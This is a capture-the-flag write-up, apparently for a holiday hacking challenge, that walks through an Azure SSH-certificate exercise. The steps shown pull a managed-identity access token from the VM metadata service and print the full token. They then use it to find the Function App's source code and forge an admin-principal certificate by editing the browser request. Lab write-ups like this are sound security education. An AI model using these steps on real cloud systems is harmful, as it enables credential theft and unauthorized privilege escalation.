@@ -1,0 +1,226 @@
+Talk to Alabaster Snowball (on Pixel Island: Rainraster Cliffs, go to the right and climb up all the ladders to the very top of the trees.)
+
+Objective: Generate a certificate with the Azure Function App and log into the SSH server (VM) with the monitor account. Then try to access Alabaster's TODO list.
+
+Hints:
+  https://www.youtube.com/watch?v=4S0Rniyidt4 (SSH Cert Demo) 
+  Without Azure CLI, use Azure REST API on the Azure VM (https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)
+  The get-source-control Azure REST API provides details on where the App is deployed from (https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01)
+
+
+(SSH server)
+  ssh-server-vm.santaworkshopgeeseislands.org
+
+(Azure Function App)
+  https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
+
+(Demo notes)
+  See SSHenanigansDemoNotes.txt for details and explanations.
+
+
+First generate public/private key pair for a user.
+
+  ~$ ssh-keygen -C "elf" -f elfkey
+    Generating public/private rsa key pair.
+    Enter passphrase (empty for no passphrase):
+    Enter same passphrase again:
+    Your identification has been saved in elfkey
+    Your public key has been saved in elfkey.pub
+    The key fingerprint is:
+    SHA256:9fd7dtx7MsG36FwHFqZDJoUetQMko5biHoP3aEmhCb0 elf
+    The key's randomart image is:
+    ...
+
+
+Copy and paste the content of the public key file (elfkey.pub) into the Azure Function App (https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl) to get the SSH certificate.
+
+    {
+      "ssh_cert": "rsa-sha2-512-cert-v01@openssh.com AAAAIX...",
+      "principal": "elf"
+    }
+
+
+Create a SSH certificate file (elfkey-cert.pub) with the values from the website. First the value of ssh_cert followed by the value of principal. The value of ssh_cert already has a space at the end, so we don't need to add an extra space. After that, connect to the server has the monitor user.
+
+  ~$ export sshserver=ssh-server-vm.santaworkshopgeeseislands.org
+  ~$ ssh monitor@$sshserver -i elfkey
+
+    ┌──────────────── Satellite Tracking Interface ────────────────┐
+    │            ____     __ ______             __                 │
+    │           / __/__ _/ //_  __/______ _____/ /__ ____          │
+    │          _\ \/ _ `/ __// / / __/ _ `/ __/  '_// __/          │
+    │         /___/\_,_/\__//_/ /_/  \_,_/\__/_\_\/_/              │
+    │                                                              │
+    ╞══════════════════════════════════════════════════════════════╡
+    │                                                              │
+    │  Position: 1.145136°, -145.261631°                           │
+    │  Velocity: 3.0703 km/s                                       │
+    │  Altitude: 35786.01 km above Earth's surface                 │
+    │  Signal Strength: 87.05%                                     │
+    │  Solar Panel Status: Deployed                                │
+    │  Battery Status: Unknown                                     │
+    │  Thermal Status: Unknown                                     │
+    │                                                              │
+    │          **** Geostationary orbit detected! ****             │
+    │                                                              │
+    └──────────────────────────────────────────────────────────────┘
+
+
+It looks like a status board that auto updates. Ctrl+C escapes out to monitor@ssh-server-vm:~$ prompt. whoami and ls -al commands show we have shell command on the SSH server.
+
+  ~$ whoami
+    monitor
+  ~$ ls -al
+    total 20
+    drwx------ 1 monitor monitor 4096 Nov  3 16:50 .
+    drwxr-xr-x 1 root    root    4096 Nov  3 16:50 ..
+    -rw-r--r-- 1 monitor monitor  220 Apr 23  2023 .bash_logout
+    -rw-r--r-- 1 monitor monitor 3649 Nov  9 17:05 .bashrc
+    -rw-r--r-- 1 monitor monitor  807 Apr 23  2023 .profile
+
+
+User "monitor" uses principal elf because of the mapping. Use the find command to see where the ssh settings are stored and see what mappings are set up.
+
+  ~$ find / -name ssh 2>/dev/null
+    /var/log/runit/ssh
+    /etc/default/ssh
+    /etc/init.d/ssh
+    /etc/ssh
+    /etc/runit/runsvdir/default/ssh
+    /etc/sv/ssh
+    /usr/bin/ssh
+    /usr/share/runit/meta/ssh
+    /usr/lib/apt/methods/ssh
+  ~$ cd /etc/ssh/
+  ~$ ls -al
+    total 620
+    drwxr-xr-x 1 root root   4096 Nov  9 14:07 .
+    drwxr-xr-x 1 root root   4096 Jan 19 01:11 ..
+    drwxr-xr-x 1 root root   4096 Nov  7 21:37 auth_principals
+    -rw-r--r-- 1 root root    107 Nov  9 14:07 ca.pub
+    ...
+  ~$ cd auth_principals
+  ~$ ls
+    alabaster  monitor
+  ~$ cat monitor
+    elf
+  ~$ cat alabaster
+    admin
+
+
+This confirms "monitor" uses the "elf" principal and "alabaster" uses the "admin" principal. We will try to find where the Azure Function App is deployed from to possibly get the source code and get a certificate with the admin principle. First we get information about the Azure account with Instance Metadata Service.
+
+  ~$ curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
+    {
+      "compute": {
+        ...
+        "resourceGroupName": "northpole-rg1",
+        "resourceId": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines/ssh-server-vm",
+        ...
+        "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
+        ...
+      },
+      ...
+    }
+
+
+We can also request an access token from within the VM.
+
+  ~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
+    {"access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDU3Nzk0MTYsIm5iZiI6MTcwNTc3OTQxNiwiZXhwIjoxNzA1ODY2MTE2LCJhaW8iOiJFMlZnWUpnY0pxbTlKZENKOVZUYzUxVXg5ZVh4QUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJ0X19jSGZHTlFFaTFBNDk5bU9JeEFRIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.pcoA-GPTGpeYBT5jkW8bFTizOWJQQuUN8Rv31Yxo8N-I4kjK5yHWkxLG9oa9WP-2F2uxqKQr2OYBN-6P8fuyuXbGxdBEyWNu2bPcdZEdx5XjwvRLIly1OHYSpLx5xvzr0TTkoQJb_H4yWaoX1MFUsixdK0PTwCtsmIYRY1jhgdSyDxj7Ue2v_wveTPwf6RtS_CgZmEKqiaHaEET65_mvOAYPlenfTIhGT6Q3n24amD8umN95zMOOi6GI3VRHAYfBqfuaiFYS23R07eN6IXa4tvIFzMkbS1Ji6uB-GeZVSN24JcCGnHECLdC71LSG7mJju2-CeJ4Qui6qVWdR_f0FRQ",
+    "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
+    "expires_in": "85590",
+    "expires_on": "1705866116",
+    "ext_expires_in": "86399",
+    "not_before": "1705779416",
+    "resource": "https://management.azure.com/",
+    "token_type": "Bearer"}
+
+
+Save the token in to an environment variable for easier use.
+
+  ~$ export token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzO
+i8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDU3Nzk0MTYsIm5iZiI6MTcwNTc3OTQxN
+iwiZXhwIjoxNzA1ODY2MTE2LCJhaW8iOiJFMlZnWUpnY0pxbTlKZENKOVZUYzUxVXg5ZVh4QUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2M
+jYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhN
+TVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQ
+TFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0a
+WQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJ0X19jSGZHTlFFaTFBNDk5bU9JeEFRIiwidmVyIjoiMS4wIiwieG1zX
+2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL
+3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1Y
+nNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY
+3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxN
+jk4NDE3NTU3fQ.pcoA-GPTGpeYBT5jkW8bFTizOWJQQuUN8Rv31Yxo8N-I4kjK5yHWkxLG9oa9WP-2F2uxqKQr2OYBN-6P8fuyuXbGxdBEyWNu2bPcdZEdx5
+XjwvRLIly1OHYSpLx5xvzr0TTkoQJb_H4yWaoX1MFUsixdK0PTwCtsmIYRY1jhgdSyDxj7Ue2v_wveTPwf6RtS_CgZmEKqiaHaEET65_mvOAYPlenfTIhGT6
+Q3n24amD8umN95zMOOi6GI3VRHAYfBqfuaiFYS23R07eN6IXa4tvIFzMkbS1Ji6uB-GeZVSN24JcCGnHECLdC71LSG7mJju2-CeJ4Qui6qVWdR_f0FRQ
+
+
+This article (learn.microsoft.com/en-us/azure/azure-functions/functions-create-serverless-api) breaks down the pieces of an Azure Function App url.
+
+  <yourapp>.azurewebsites.net/api/<funcname>?code=<functionkey>
+  northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
+
+    App = northpole-ssh-certs-fa
+    FuncName = create-cert
+    FuncKey = candy-cane-twirl
+
+
+With the get-source-control (learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01) we can a github repository.
+
+  ~$ curl -H "Authorization: Bearer $token" -H 'Content-Type: application/json' -X GET 'https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01'
+    {
+      ...
+      "properties": {
+        "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
+        ...
+      }
+    }
+
+
+The repository points to a python function (https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa/blob/main/function_app.py) for signing the public SSH keys into certificates. Line 45 tries to get the principal from the submitted data. If it doesn't exist, then it uses the value from the environment variable.
+
+  principal = data.get("principal", DEFAULT_PRINCIPAL)
+
+
+Going back to the certificate request website, we can resend the POST request with principal of admin. First right click anywhere on the website > Inspect. This opens the dev console in Chrome. Submit the public key like before to get the certificate with the elf principal. Go to the Network tab of the dev console and copy the fetch event as fetch. Go to the Console tab to paste the fetch code. Add the principal value to the body of the fetch request to get a new certificate with the admin principal.
+
+  "body": "{\"ssh_pub_key\":\"ssh-rsa ... elf\\n\",\"principal\":\"admin\"}"
+
+
+Replace the content of the elfkey-cert.pub file with the new ssh_cert value and log back in as alabaster.
+
+  ~$ exit
+  ~$ ssh alabaster@$sshserver -i elfkey  
+
+
+Alabaster wants to see if we can get to his TODO list.
+
+  ~$ ls -al
+    total 36
+    drwx------ 1 alabaster alabaster 4096 Nov  9 14:07 .
+    drwxr-xr-x 1 root      root      4096 Nov  3 16:50 ..
+    -rw-r--r-- 1 alabaster alabaster  220 Apr 23  2023 .bash_logout
+    -rw-r--r-- 1 alabaster alabaster 3665 Nov  9 17:03 .bashrc
+    drwxr-xr-x 3 alabaster alabaster 4096 Nov  9 14:07 .cache
+    -rw-r--r-- 1 alabaster alabaster  807 Apr 23  2023 .profile
+    drwxr-xr-x 6 alabaster alabaster 4096 Nov  9 14:07 .venv
+    -rw------- 1 alabaster alabaster 1126 Nov  9 14:07 alabaster_todo.md
+    drwxr-xr-x 2 alabaster alabaster 4096 Nov  9 14:07 impacket
+  ~$ cat alabaster_todo.md
+    # Geese Islands IT & Security Todo List
+
+    - [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
+    - [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
+    - [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
+    - [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
+    - [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
+    - [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
+    - [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
+
+The challenge is looking for the type of cookie cache Alabaster plans to implement.
+
+  ~$ grep cookie alabaster_todo.md
+    - [ ] Gingerbread Cookie Cache...
+
+
+Answer: Gingerbread
